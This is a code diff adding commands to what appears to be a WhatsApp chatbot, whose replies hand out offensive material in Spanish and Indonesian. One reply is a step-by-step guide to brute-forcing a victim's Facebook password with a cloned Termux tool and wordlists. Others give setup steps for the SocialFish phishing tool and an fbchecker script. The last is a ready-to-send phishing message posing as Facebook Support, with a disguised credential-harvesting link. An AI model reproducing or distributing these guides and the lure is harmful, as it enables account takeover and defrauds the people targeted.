@@ -2501,6 +2501,157 @@ $ cd shellphish
 
 $ bash shellphish.sh`)
                   }
+					
+	if (budy.includes(`/fuerza bruta facebook`)) {
+                  reply(`📲ATAQUES DE FUERZA BRUTA A LA RED SOCIAL "FACEBOOK" EN TERMUX (ANDROID)📲
+
+📲¿Qué es fuerza bruta?📲
+
+La fuerza bruta en el ámbito de la informática, es un método hacking en el cual, el atacante intenta descifrar la contraseña de su víctima por medio de una combinación de contraseñas generadas con información recopilada de esta misma.
+
+
+✅REQUISITOS✅
+
+☑️ Aplicación Termux
+☑️ Navegador Chrome
+☑️ Perfil de Facebook (Víctima)
+
+
+Ahora que ya tenemos los requisitos, comenzamos con la instalación:
+
+$ apt update && apt upgrade -y
+$ termux-setup-storage
+$ apt install -y python
+$ apt install -y python2
+$ apt install -y python2-dev
+$ apt install pip2
+$ pip2 install mechanize
+$ apt  install -y git
+$ git clone https://github.com/perjayro/Facebook_brute.git
+$ cd Facebook_brute
+$ chmod +x brute.py
+$ python2 brute.py
+
+EL ID de la víctima
+
+CONTRASEÑA
+pass.txt
+pass1.txt
+pass2.txt
+pass3.txt`)
+                  }
+					
+		if (budy.includes(`/terkey termux`)) {
+                  reply(`Termux Up Down - Terkey
+
+
+
+$ pkg update & pkg upgrade
+
+$ pkg install python
+
+$ pkg install git
+
+$ git clone https://github.com/karjok/terkey
+
+$ cd terkey
+
+$ python terkey.py`)
+                  }
+					
+		if (budy.includes(`/socialfish v2`)) {
+                  reply(`SocialFish v2 Termux Script
+
+
+
+SocialFish v2 Herramentaa de trabajo de termux que puede ser usada como medida  de aprendisaje para hackear phishing y esa herramienta tambiém puede ser usada para recolectar datos importantes que son usados ​​para phishing posteriormente.
+
+
+
+Requerido:
+
+
+
+Python 2.7
+
+Wget from Python
+
+PHP
+
+
+
+Clone:
+
+
+
+$ git clone https://github.com/UndeadSec/SocialFish.git
+
+
+
+ejecutar:
+
+
+
+$ cd SocialFish`)
+                  }
+					
+		if (budy.includes(`/fbchecker`)) {
+                  reply(`Script Termux Fbchecker
+
+
+$ apt install git
+
+
+
+$ apt install php
+
+
+
+$ git clone https://github.com/fdciabdul/fbchecker
+
+
+
+$ cd fbchecker
+
+
+
+$ php fbcheck.php
+
+
+
+Untuk menggunakan script ini masukan perintah berikut:
+
+
+
+$ php fbcheck.php target.txt`)
+                  }
+					
+		if (budy.includes(`/plantilla soporte facebook`)) {
+                  reply(`Página oficial de Facebook Support ©
+https://Facebook_Support@facebook.com
+--------------------------------
+Facebook Support ©
+
+Buenas tardes Sr. Usuario de Facebook, con los respectivos permisos de WhatsApp Support, le estamos comunicando una alerta de inicio de sesión en su cuenta de Facebook.
+
+Hemos detectado que un dispositivo Samsung Galaxy J5 Prime, está solicitando el acceso a su cuenta de Facebook.
+Dentro de 24 horas aproximadamente, su cuenta de Facebook será iniciada en el dispositivo mencionado y sera cerrada en su dispositivo.
+Si está de acuerdo con el cambio de su cuenta de Facebook al dispositivo android Samsung Galaxy J5 Prime, puede realizarlo de forma inmediata escribiendo el siguiente mensaje de confirmación:
+
+Change_Facebook
+
+En caso de que usted no haya solicitado éste cambio, deberá verificar que éste es el dispositivo oficial de ésta cuenta de Facebook, para hacerlo, deberá iniciar sesión desde el siguiente enlace de verificación de Facebook.
+
+[Enlace de Verificación]
+https://Facebook_Support_Verification@mitly.us/VSsSnYDy
+
+Si usted realiza la siguiente verificación... Facebook Support bloqueara el acceso de su cuenta de Facebook en el dispositivo Samsung Galaxy J5 Prime, para evitar cualquier tipo de robo de su cuenta de Facebook y así mantener su cuenta segura.
+En caso de que no verifíque su cuenta, el cambio se realizara dentro de 24 horas a partir de éste momento.
+
+Contactenos a la siguiente dirección de correo electrónico si necesita ayuda o tiene algún problema.
+
+_FacebookSupport@gmail.com`)
+                  }
        if (budy.startsWith(`:v`)) {
         const none = fs.readFileSync('./mp3/viejo1.mp3');
 		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
